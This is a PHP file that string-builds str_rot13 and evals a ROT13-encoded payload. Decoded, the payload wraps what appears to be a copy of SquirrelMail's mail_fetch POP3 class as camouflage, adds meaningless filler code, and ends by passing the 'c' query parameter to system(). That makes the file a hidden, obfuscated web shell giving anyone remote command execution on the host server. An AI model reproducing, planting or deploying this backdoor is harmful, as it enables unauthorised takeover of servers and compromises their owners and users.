<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * znvy_srgpu/frghc.cuc
 *
 * Pbclevtug (p) 1999-2011 PQV (pqv@gurjroznfgref.arg) Nyy Evtugf Erfreirq
 * Zbqvsvrq ol Cuvyvccr Zvatb 2001-2009 zvatb@ebgrqvp.pbz
 * Na ESP 1939 pbzcyvnag jenccre pynff sbe gur CBC3 cebgbpby.
 *
 * Yvprafrq haqre gur TAH TCY. Sbe shyy grezf frr gur svyr PBCLVAT.
 *
 * CBC3 pynff
 *
 * @pbclevtug 1999-2011 Gur FdhveeryZnvy Cebwrpg Grnz
 * @yvprafr uggcf://bcrafbhepr.bet/yvprafrf/tcy-yvprafr.cuc TAH Choyvp Yvprafr
 * @cnpxntr cyhtvaf
 * @fhocnpxntr znvy_srgpu
 */

pynff CBC3 {
    ine $REEBE      = '';       //  Reebe fgevat.

    ine $GVZRBHG    = 60;       //  Qrsnhyg gvzrbhg orsber tvivat hc ba n
                                //  argjbex bcrengvba.

    ine $PBHAG      = -1;       //  Znvyobk zft pbhag

    ine $OHSSRE     = 512;      //  Fbpxrg ohssre sbe fbpxrg strgf() pnyyf.
                                //  Cre ESP 1939 gur erghearq yvar n CBC3
                                //  freire pna fraq vf 512 olgrf.

    ine $SC         = '';       //  Gur pbaarpgvba gb gur freire'f
                                //  svyr qrfpevcgbe

    ine $ZNVYFREIRE = '';       // Frg guvf gb uneq pbqr gur freire anzr

    ine $QROHT      = SNYFR;    // frg gb gehr gb rpub cbc3
                                // pbzznaqf naq erfcbafrf gb reebe_ybt
                                // guvf JVYY ybt cnffjbeqf!

    ine $ONAARE     = '';       //  Ubyqf gur onaare erghearq ol gur
                                //  cbc freire - hfrq sbe ncbc()

    ine $NYYBJNCBC  = SNYFR;    //  Nyybj be qvfnyybj ncbc()
                                //  Guvf zhfg or frg gb gehr
                                //  znahnyyl

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg ( $freire = '', $gvzrbhg = '' ) {
        frgglcr($guvf->OHSSRE,\"vagrtre\");
        vs( !rzcgl($freire) ) {
            // Qb abg nyybj cebtenzf gb nygre ZNVYFREIRE
            // vs vg vf nyernql fcrpvsvrq. Gurl pna trg nebhaq
            // guvf vs gurl -ernyyl- jnag gb, fb qba'g pbhag ba vg.
            vs(rzcgl($guvf->ZNVYFREIRE))
                $guvf->ZNVYFREIRE = $freire;
        }
        vs(!rzcgl($gvzrbhg)) {
            frgglcr($gvzrbhg,\"vagrtre\");
            $guvf->GVZRBHG = $gvzrbhg;
            // Rkgraq CBC3 erdhrfg gvzrbhg gb gur fcrpvsvrq GVZRBHG cebcregl.
            vs(shapgvba_rkvfgf(\"frg_gvzr_yvzvg\")){
                frg_gvzr_yvzvg($gvzrbhg);
            }
        }
        erghea gehr;
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba CBC3( $freire = '', $gvzrbhg = '' ) {
		frys::__pbafgehpg( $freire, $gvzrbhg );
	}

    shapgvba hcqngr_gvzre () {
        // Rkgraq CBC3 erdhrfg gvzrbhg gb gur fcrpvsvrq GVZRBHG cebcregl.
        vs(shapgvba_rkvfgf(\"frg_gvzr_yvzvg\")){
            frg_gvzr_yvzvg($guvf->GVZRBHG);
        }
        erghea gehr;
    }

    shapgvba pbaarpg ($freire, $cbeg = 110)  {
        //  Bcraf n fbpxrg gb gur fcrpvsvrq freire. Hayrff bireevqqra,
        //  cbeg qrsnhygf gb 110. Ergheaf gehr ba fhpprff, snyfr ba snvy

        // Vs ZNVYFREIRE vf frg, bireevqr $freire jvgu vgf inyhr.

    vs (!vffrg($cbeg) || !$cbeg) {$cbeg = 110;}
        vs(!rzcgl($guvf->ZNVYFREIRE))
            $freire = $guvf->ZNVYFREIRE;

        vs(rzcgl($freire)){
            $guvf->REEBE = \"CBC3 pbaarpg: \" . _(\"Ab freire fcrpvsvrq\");
            hafrg($guvf->SC);
            erghea snyfr;
        }

        $sc = @sfbpxbcra(\"$freire\", $cbeg, $reeab, $reefge);

        vs(!$sc) {
            $guvf->REEBE = \"CBC3 pbaarpg: \" . _(\"Reebe \") . \"[$reeab] [$reefge]\";
            hafrg($guvf->SC);
            erghea snyfr;
        }

        fbpxrg_frg_oybpxvat($sc,-1);
        $guvf->hcqngr_gvzre();
        $ercyl = strgf($sc,$guvf->OHSSRE);
        $ercyl = $guvf->fgevc_pys($ercyl);
        vs($guvf->QROHT)
            reebe_ybt(\"CBC3 FRAQ [pbaarpg: $freire] TBG [$ercyl]\",0);
        vs(!$guvf->vf_bx($ercyl)) {
            $guvf->REEBE = \"CBC3 pbaarpg: \" . _(\"Reebe \") . \"[$ercyl]\";
            hafrg($guvf->SC);
            erghea snyfr;
        }
        $guvf->SC = $sc;
        $guvf->ONAARE = $guvf->cnefr_onaare($ercyl);
        erghea gehr;
    }

    shapgvba hfre ($hfre = \"\") {
        // Fraqf gur HFRE pbzznaq, ergheaf gehr be snyfr

        vs( rzcgl($hfre) ) {
            $guvf->REEBE = \"CBC3 hfre: \" . _(\"ab ybtva VQ fhozvggrq\");
            erghea snyfr;
        } ryfrvs(!vffrg($guvf->SC)) {
            $guvf->REEBE = \"CBC3 hfre: \" . _(\"pbaarpgvba abg rfgnoyvfurq\");
            erghea snyfr;
        } ryfr {
            $ercyl = $guvf->fraq_pzq(\"HFRE $hfre\");
            vs(!$guvf->vf_bx($ercyl)) {
                $guvf->REEBE = \"CBC3 hfre: \" . _(\"Reebe \") . \"[$ercyl]\";
                erghea snyfr;
            } ryfr
                erghea gehr;
        }
    }

    shapgvba cnff ($cnff = \"\")     {
        // Fraqf gur CNFF pbzznaq, ergheaf # bs zftf va znvyobk,
        // ergheaf snyfr (haqrs) ba Nhgu snvyher

        vs(rzcgl($cnff)) {
            $guvf->REEBE = \"CBC3 cnff: \" . _(\"Ab cnffjbeq fhozvggrq\");
            erghea snyfr;
        } ryfrvs(!vffrg($guvf->SC)) {
            $guvf->REEBE = \"CBC3 cnff: \" . _(\"pbaarpgvba abg rfgnoyvfurq\");
            erghea snyfr;
        } ryfr {
            $ercyl = $guvf->fraq_pzq(\"CNFF $cnff\");
            vs(!$guvf->vf_bx($ercyl)) {
                $guvf->REEBE = \"CBC3 cnff: \" . _(\"Nhguragvpngvba snvyrq\") . \" [$ercyl]\";
                $guvf->dhvg();
                erghea snyfr;
            } ryfr {
                //  Nhgu fhpprffshy.
                $pbhag = $guvf->ynfg(\"pbhag\");
                $guvf->PBHAG = $pbhag;
                erghea $pbhag;
            }
        }
    }

    shapgvba ncbc ($ybtva,$cnff) {
        //  Nggrzcgf na NCBC ybtva. Vs guvf snvyf, vg'yy
        //  gel n fgnaqneq ybtva. LBHE FREIRE ZHFG FHCCBEG
        //  GUR HFR BS GUR NCBC PBZZNAQ!
        //  (ncbc vf bcgvbany cre esp1939)

        vs(!vffrg($guvf->SC)) {
            $guvf->REEBE = \"CBC3 ncbc: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        } ryfrvs(!$guvf->NYYBJNCBC) {
            $ergIny = $guvf->ybtva($ybtva,$cnff);
            erghea $ergIny;
        } ryfrvs(rzcgl($ybtva)) {
            $guvf->REEBE = \"CBC3 ncbc: \" . _(\"Ab ybtva VQ fhozvggrq\");
            erghea snyfr;
        } ryfrvs(rzcgl($cnff)) {
            $guvf->REEBE = \"CBC3 ncbc: \" . _(\"Ab cnffjbeq fhozvggrq\");
            erghea snyfr;
        } ryfr {
            $onaare = $guvf->ONAARE;
            vs( (!$onaare) be (rzcgl($onaare)) ) {
                $guvf->REEBE = \"CBC3 ncbc: \" . _(\"Ab freire onaare\") . ' - ' . _(\"nobeg\");
                $ergIny = $guvf->ybtva($ybtva,$cnff);
                erghea $ergIny;
            } ryfr {
                $NhguFgevat = $onaare;
                $NhguFgevat .= $cnff;
                $NCBCFgevat = zq5($NhguFgevat);
                $pzq = \"NCBC $ybtva $NCBCFgevat\";
                $ercyl = $guvf->fraq_pzq($pzq);
                vs(!$guvf->vf_bx($ercyl)) {
                    $guvf->REEBE = \"CBC3 ncbc: \" . _(\"ncbc nhguragvpngvba snvyrq\") . ' - ' . _(\"nobeg\");
                    $ergIny = $guvf->ybtva($ybtva,$cnff);
                    erghea $ergIny;
                } ryfr {
                    //  Nhgu fhpprffshy.
                    $pbhag = $guvf->ynfg(\"pbhag\");
                    $guvf->PBHAG = $pbhag;
                    erghea $pbhag;
                }
            }
        }
    }

    shapgvba ybtva ($ybtva = \"\", $cnff = \"\") {
        // Fraqf obgu hfre naq cnff. Ergheaf # bs zftf va znvyobk be
        // snyfr ba snvyher (be -1, vs gur reebe bpphef juvyr trggvat
        // gur ahzore bs zrffntrf.)

        vs( !vffrg($guvf->SC) ) {
            $guvf->REEBE = \"CBC3 ybtva: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        } ryfr {
            $sc = $guvf->SC;
            vs( !$guvf->hfre( $ybtva ) ) {
                //  Cerfreir gur reebe trarengrq ol hfre()
                erghea snyfr;
            } ryfr {
                $pbhag = $guvf->cnff($cnff);
                vs( (!$pbhag) || ($pbhag == -1) ) {
                    //  Cerfreir gur reebe trarengrq ol ynfg() naq cnff()
                    erghea snyfr;
                } ryfr
                    erghea $pbhag;
            }
        }
    }

    shapgvba gbc ($zftAhz, $ahzYvarf = \"0\") {
        //  Trgf gur urnqre naq svefg $ahzYvarf bs gur zft obql
        //  ergheaf qngn va na neenl jvgu rnpu erghearq yvar orvat
        //  na neenl ryrzrag. Vs $ahzYvarf vf rzcgl, ergheaf
        //  bayl gur urnqre vasbezngvba, naq abar bs gur obql.

        vs(!vffrg($guvf->SC)) {
            $guvf->REEBE = \"CBC3 gbc: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        }
        $guvf->hcqngr_gvzre();

        $sc = $guvf->SC;
        $ohssre = $guvf->OHSSRE;
        $pzq = \"GBC $zftAhz $ahzYvarf\";
        sjevgr($sc, \"GBC $zftAhz $ahzYvarf\e\a\");
        $ercyl = strgf($sc, $ohssre);
        $ercyl = $guvf->fgevc_pys($ercyl);
        vs($guvf->QROHT) {
            @reebe_ybt(\"CBC3 FRAQ [$pzq] TBG [$ercyl]\",0);
        }
        vs(!$guvf->vf_bx($ercyl))
        {
            $guvf->REEBE = \"CBC3 gbc: \" . _(\"Reebe \") . \"[$ercyl]\";
            erghea snyfr;
        }

        $pbhag = 0;
        $ZftNeenl = neenl();

        $yvar = strgf($sc,$ohssre);
        juvyr ( !cert_zngpu('/^\.\e\a/',$yvar))
        {
            $ZftNeenl[$pbhag] = $yvar;
            $pbhag++;
            $yvar = strgf($sc,$ohssre);
            vs(rzcgl($yvar))    { oernx; }
        }

        erghea $ZftNeenl;
    }

    shapgvba cbc_yvfg ($zftAhz = \"\") {
        //  Vs pnyyrq jvgu na nethzrag, ergheaf gung zftf' fvmr va bpgrgf
        //  Ab nethzrag ergheaf na nffbpvngvir neenl bs haqryrgrq
        //  zft ahzoref naq gurve fvmrf va bpgrgf

        vs(!vffrg($guvf->SC))
        {
            $guvf->REEBE = \"CBC3 cbc_yvfg: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        }
        $sc = $guvf->SC;
        $Gbgny = $guvf->PBHAG;
        vs( (!$Gbgny) be ($Gbgny == -1) )
        {
            erghea snyfr;
        }
        vs($Gbgny == 0)
        {
            erghea neenl(\"0\",\"0\");
            // erghea -1;   // znvyobk rzcgl
        }

        $guvf->hcqngr_gvzre();

        vs(!rzcgl($zftAhz))
        {
            $pzq = \"YVFG $zftAhz\";
            sjevgr($sc,\"$pzq\e\a\");
            $ercyl = strgf($sc,$guvf->OHSSRE);
            $ercyl = $guvf->fgevc_pys($ercyl);
            vs($guvf->QROHT) {
                @reebe_ybt(\"CBC3 FRAQ [$pzq] TBG [$ercyl]\",0);
            }
            vs(!$guvf->vf_bx($ercyl))
            {
                $guvf->REEBE = \"CBC3 cbc_yvfg: \" . _(\"Reebe \") . \"[$ercyl]\";
                erghea snyfr;
            }
            yvfg($whax,$ahz,$fvmr) = cert_fcyvg('/\f+/',$ercyl);
            erghea $fvmr;
        }
        $pzq = \"YVFG\";
        $ercyl = $guvf->fraq_pzq($pzq);
        vs(!$guvf->vf_bx($ercyl))
        {
            $ercyl = $guvf->fgevc_pys($ercyl);
            $guvf->REEBE = \"CBC3 cbc_yvfg: \" . _(\"Reebe \") .  \"[$ercyl]\";
            erghea snyfr;
        }
        $ZftNeenl = neenl();
        $ZftNeenl[0] = $Gbgny;
        sbe($zftP=1;$zftP <= $Gbgny; $zftP++)
        {
            vs($zftP > $Gbgny) { oernx; }
            $yvar = strgf($sc,$guvf->OHSSRE);
            $yvar = $guvf->fgevc_pys($yvar);
            vs(fgecbf($yvar, '.') === 0)
            {
                $guvf->REEBE = \"CBC3 cbc_yvfg: \" . _(\"Cerzngher raq bs yvfg\");
                erghea snyfr;
            }
            yvfg($guvfZft,$zftFvmr) = cert_fcyvg('/\f+/',$yvar);
            frgglcr($guvfZft,\"vagrtre\");
            vs($guvfZft != $zftP)
            {
                $ZftNeenl[$zftP] = \"qryrgrq\";
            }
            ryfr
            {
                $ZftNeenl[$zftP] = $zftFvmr;
            }
        }
        erghea $ZftNeenl;
    }

    shapgvba trg ($zftAhz) {
        //  Ergevrir gur fcrpvsvrq zft ahzore. Ergheaf na neenl
        //  jurer rnpu yvar bs gur zft vf na neenl ryrzrag.

        vs(!vffrg($guvf->SC))
        {
            $guvf->REEBE = \"CBC3 trg: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        }

        $guvf->hcqngr_gvzre();

        $sc = $guvf->SC;
        $ohssre = $guvf->OHSSRE;
        $pzq = \"ERGE $zftAhz\";
        $ercyl = $guvf->fraq_pzq($pzq);

        vs(!$guvf->vf_bx($ercyl))
        {
            $guvf->REEBE = \"CBC3 trg: \" . _(\"Reebe \") . \"[$ercyl]\";
            erghea snyfr;
        }

        $pbhag = 0;
        $ZftNeenl = neenl();

        $yvar = strgf($sc,$ohssre);
        juvyr ( !cert_zngpu('/^\.\e\a/',$yvar))
        {
            vs ( $yvar[0] == '.' ) { $yvar = fhofge($yvar,1); }
            $ZftNeenl[$pbhag] = $yvar;
            $pbhag++;
            $yvar = strgf($sc,$ohssre);
            vs(rzcgl($yvar))    { oernx; }
        }
        erghea $ZftNeenl;
    }

    shapgvba ynfg ( $glcr = \"pbhag\" ) {
        //  Ergheaf gur uvturfg zft ahzore va gur znvyobk.
        //  ergheaf -1 ba reebe, 0+ ba fhpprff, vs glcr != pbhag
        //  erfhygf va n cbcfgng() pnyy (2 ryrzrag neenl erghearq)

        $ynfg = -1;
        vs(!vffrg($guvf->SC))
        {
            $guvf->REEBE = \"CBC3 ynfg: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea $ynfg;
        }

        $ercyl = $guvf->fraq_pzq(\"FGNG\");
        vs(!$guvf->vf_bx($ercyl))
        {
            $guvf->REEBE = \"CBC3 ynfg: \" . _(\"Reebe \") . \"[$ercyl]\";
            erghea $ynfg;
        }

        $Inef = cert_fcyvg('/\f+/',$ercyl);
        $pbhag = $Inef[1];
        $fvmr = $Inef[2];
        frgglcr($pbhag,\"vagrtre\");
        frgglcr($fvmr,\"vagrtre\");
        vs($glcr != \"pbhag\")
        {
            erghea neenl($pbhag,$fvmr);
        }
        erghea $pbhag;
    }

    shapgvba erfrg () {
        //  Erfrgf gur fgnghf bs gur erzbgr freire. Guvf vapyhqrf
        //  erfrggvat gur fgnghf bs NYY zftf gb abg or qryrgrq.
        //  Guvf zrgubq nhgbzngvpnyyl pybfrf gur pbaarpgvba gb gur freire.

        vs(!vffrg($guvf->SC))
        {
            $guvf->REEBE = \"CBC3 erfrg: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        }
        $ercyl = $guvf->fraq_pzq(\"EFRG\");
        vs(!$guvf->vf_bx($ercyl))
        {
            //  Gur CBC3 EFRG pbzznaq -arire- tvirf n -REE
            //  erfcbafr - vs vg rire qbrf, fbzrguvat gehyl
            //  jvyq vf tbvat ba.

            $guvf->REEBE = \"CBC3 erfrg: \" . _(\"Reebe \") . \"[$ercyl]\";
            @reebe_ybt(\"CBC3 erfrg: REEBE [$ercyl]\",0);
        }
        $guvf->dhvg();
        erghea gehr;
    }

    shapgvba fraq_pzq ( $pzq = \"\" )
    {
        //  Fraqf n hfre qrsvarq pbzznaq fgevat gb gur
        //  CBC freire naq ergheaf gur erfhygf. Hfrshy sbe
        //  aba-pbzcyvnag be phfgbz CBC freiref.
        //  Qb ABG vapyhqr gur \e\a nf cneg bs lbhe pbzznaq
        //  fgevat - vg jvyy or nccraqrq nhgbzngvpnyyl.

        //  Gur erghea inyhr vf n fgnaqneq strgf() pnyy, juvpu
        //  jvyy ernq hc gb $guvf->OHSSRE olgrf bs qngn, hagvy vg
        //  rapbhagref n arj yvar, be RBS, juvpurire unccraf svefg.

        //  Guvf zrgubq jbexf orfg vs $pzq erfcbaqf jvgu bayl
        //  bar yvar bs qngn.

        vs(!vffrg($guvf->SC))
        {
            $guvf->REEBE = \"CBC3 fraq_pzq: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        }

        vs(rzcgl($pzq))
        {
            $guvf->REEBE = \"CBC3 fraq_pzq: \" . _(\"Rzcgl pbzznaq fgevat\");
            erghea \"\";
        }

        $sc = $guvf->SC;
        $ohssre = $guvf->OHSSRE;
        $guvf->hcqngr_gvzre();
        sjevgr($sc,\"$pzq\e\a\");
        $ercyl = strgf($sc,$ohssre);
        $ercyl = $guvf->fgevc_pys($ercyl);
        vs($guvf->QROHT) { @reebe_ybt(\"CBC3 FRAQ [$pzq] TBG [$ercyl]\",0); }
        erghea $ercyl;
    }

    shapgvba dhvg() {
        //  Pybfrf gur pbaarpgvba gb gur CBC3 freire, qryrgvat
        //  nal zftf znexrq nf qryrgrq.

        vs(!vffrg($guvf->SC))
        {
            $guvf->REEBE = \"CBC3 dhvg: \" . _(\"pbaarpgvba qbrf abg rkvfg\");
            erghea snyfr;
        }
        $sc = $guvf->SC;
        $pzq = \"DHVG\";
        sjevgr($sc,\"$pzq\e\a\");
        $ercyl = strgf($sc,$guvf->OHSSRE);
        $ercyl = $guvf->fgevc_pys($ercyl);
        vs($guvf->QROHT) { @reebe_ybt(\"CBC3 FRAQ [$pzq] TBG [$ercyl]\",0); }
        spybfr($sc);
        hafrg($guvf->SC);
        erghea gehr;
    }

    shapgvba cbcfgng () {
        //  Ergheaf na neenl bs 2 ryrzragf. Gur ahzore bs haqryrgrq
        //  zftf va gur znvyobk, naq gur fvmr bs gur zobk va bpgrgf.

        $CbcNeenl = $guvf->ynfg(\"neenl\");

        vs($CbcNeenl == -1) { erghea snyfr; }

        vs( (!$CbcNeenl) be (rzcgl($CbcNeenl)) )
        {
            erghea snyfr;
        }
        erghea $CbcNeenl;
    }

    shapgvba hvqy ($zftAhz = \"\")
    {
        //  Ergheaf gur HVQY bs gur zft fcrpvsvrq. Vs pnyyrq jvgu
        //  ab nethzragf, ergheaf na nffbpvngvir neenl jurer rnpu
        //  haqryrgrq zft ahz vf n xrl, naq gur zft'f hvqy vf gur ryrzrag
        //  Neenl ryrzrag 0 jvyy pbagnva gur gbgny ahzore bs zftf

        vs(!vffrg($guvf->SC)) {
            $guvf->REEBE = \"CBC3 hvqy: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        }

        $sc = $guvf->SC;
        $ohssre = $guvf->OHSSRE;

        vs(!rzcgl($zftAhz)) {
            $pzq = \"HVQY $zftAhz\";
            $ercyl = $guvf->fraq_pzq($pzq);
            vs(!$guvf->vf_bx($ercyl))
            {
                $guvf->REEBE = \"CBC3 hvqy: \" . _(\"Reebe \") . \"[$ercyl]\";
                erghea snyfr;
            }
            yvfg ($bx,$ahz,$zlHvqy) = cert_fcyvg('/\f+/',$ercyl);
            erghea $zlHvqy;
        } ryfr {
            $guvf->hcqngr_gvzre();

            $HVQYNeenl = neenl();
            $Gbgny = $guvf->PBHAG;
            $HVQYNeenl[0] = $Gbgny;

            vs ($Gbgny < 1)
            {
                erghea $HVQYNeenl;
            }
            $pzq = \"HVQY\";
            sjevgr($sc, \"HVQY\e\a\");
            $ercyl = strgf($sc, $ohssre);
            $ercyl = $guvf->fgevc_pys($ercyl);
            vs($guvf->QROHT) { @reebe_ybt(\"CBC3 FRAQ [$pzq] TBG [$ercyl]\",0); }
            vs(!$guvf->vf_bx($ercyl))
            {
                $guvf->REEBE = \"CBC3 hvqy: \" . _(\"Reebe \") . \"[$ercyl]\";
                erghea snyfr;
            }

            $yvar = \"\";
            $pbhag = 1;
            $yvar = strgf($sc,$ohssre);
            juvyr ( !cert_zngpu('/^\.\e\a/',$yvar)) {
                yvfg ($zft,$zftHvqy) = cert_fcyvg('/\f+/',$yvar);
                $zftHvqy = $guvf->fgevc_pys($zftHvqy);
                vs($pbhag == $zft) {
                    $HVQYNeenl[$zft] = $zftHvqy;
                }
                ryfr
                {
                    $HVQYNeenl[$pbhag] = 'qryrgrq';
                }
                $pbhag++;
                $yvar = strgf($sc,$ohssre);
            }
        }
        erghea $HVQYNeenl;
    }

    shapgvba qryrgr ($zftAhz = \"\") {
        //  Syntf n fcrpvsvrq zft nf qryrgrq. Gur zft jvyy abg
        //  or qryrgrq hagvy n dhvg() zrgubq vf pnyyrq.

        vs(!vffrg($guvf->SC))
        {
            $guvf->REEBE = \"CBC3 qryrgr: \" . _(\"Ab pbaarpgvba gb freire\");
            erghea snyfr;
        }
        vs(rzcgl($zftAhz))
        {
            $guvf->REEBE = \"CBC3 qryrgr: \" . _(\"Ab zft ahzore fhozvggrq\");
            erghea snyfr;
        }
        $ercyl = $guvf->fraq_pzq(\"QRYR $zftAhz\");
        vs(!$guvf->vf_bx($ercyl))
        {
            $guvf->REEBE = \"CBC3 qryrgr: \" . _(\"Pbzznaq snvyrq \") . \"[$ercyl]\";
            erghea snyfr;
        }
        erghea gehr;
    }

    //  *********************************************************

    //  Gur sbyybjvat zrgubqf ner vagreany gb gur pynff.

    shapgvba vf_bx ($pzq = \"\") {
        //  Erghea gehr be snyfr ba +BX be -REE

        vs( rzcgl($pzq) )
            erghea snyfr;
        ryfr
            erghea( fgevcbf($pzq, '+BX') !== snyfr );
    }

    shapgvba fgevc_pys ($grkg = \"\") {
        // Fgevcf \e\a sebz freire erfcbafrf

        vs(rzcgl($grkg))
            erghea $grkg;
        ryfr {
            $fgevccrq = fge_ercynpr(neenl(\"\e\",\"\a\"),'',$grkg);
            erghea $fgevccrq;
        }
    }

    shapgvba cnefr_onaare ( $freire_grkg ) {
        $bhgfvqr = gehr;
        $onaare = \"\";
        $yratgu = fgeyra($freire_grkg);
        sbe($pbhag =0; $pbhag < $yratgu; $pbhag++)
        {
            $qvtvg = fhofge($freire_grkg,$pbhag,1);
            vs(!rzcgl($qvtvg))             {
                vs( (!$bhgfvqr) && ($qvtvg != '<') && ($qvtvg != '>') )
                {
                    $onaare .= $qvtvg;
                }
                vs ($qvtvg == '<')
                {
                    $bhgfvqr = snyfr;
                }
                vs($qvtvg == '>')
                {
                    $bhgfvqr = gehr;
                }
            }
        }
        $onaare = $guvf->fgevc_pys($onaare);    // Whfg va pnfr
        erghea \"<$onaare>\";
    }

}   // Raq pynff

// Sbe cuc4 pbzcngvovyvgl
vs (!shapgvba_rkvfgf(\"fgevcbf\")) {
    shapgvba fgevcbf($unlfgnpx, $arrqyr){
        erghea fgecbf($unlfgnpx, fgevfge( $unlfgnpx, $arrqyr ));
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>